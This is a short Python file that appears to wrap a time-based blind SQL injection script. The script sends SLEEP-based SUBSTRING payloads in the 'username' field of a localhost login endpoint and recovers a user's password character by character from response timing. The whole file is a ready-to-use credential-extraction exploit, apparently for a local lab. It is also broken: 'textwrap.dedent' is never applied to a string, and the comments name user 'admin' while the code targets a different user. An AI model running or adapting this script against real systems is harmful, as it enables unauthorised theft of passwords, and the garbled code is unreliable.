from pathlib import Path
import textwrap

# Python script to extract password for known user 'admin' using time-based blind SQLi
script_code = textwrap.dedent
import httpx
import time

TARGET_URL = "http://localhost:5000/blind"
KNOWN_USER = "steveee79"
DELAY = 5
TIME_THRESHOLD = 3  # Adjust based on your environment
MAX_LENGTH = 32
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-="

def extract_password():
        password = ""
        for position in range(1, MAX_LENGTH + 1):
            found = False
            for char in CHARSET:
                payload = f"{KNOWN_USER}' AND BINARY SUBSTRING(password,{position},1)='{char}' AND SLEEP({DELAY})-- "
                start = time.time()
                r = httpx.post(TARGET_URL, data={"username": payload}, timeout=DELAY + 3)
                duration = time.time() - start
                print(f"[+] Testing position {position}, char '{char}': {duration:.2f}s")
                if duration > TIME_THRESHOLD:
                    password += char
                    print(f"[✓] Found character at position {position}: {char}")
                    found = True
                    break
            if not found:
                print("[!] No more characters found. Stopping.")
                break
        return password

if __name__ == "__main__":
        print("[*] Starting password extraction for user 'admin'")
        extracted = extract_password()
        print(f"[+] Extracted password: {extracted}")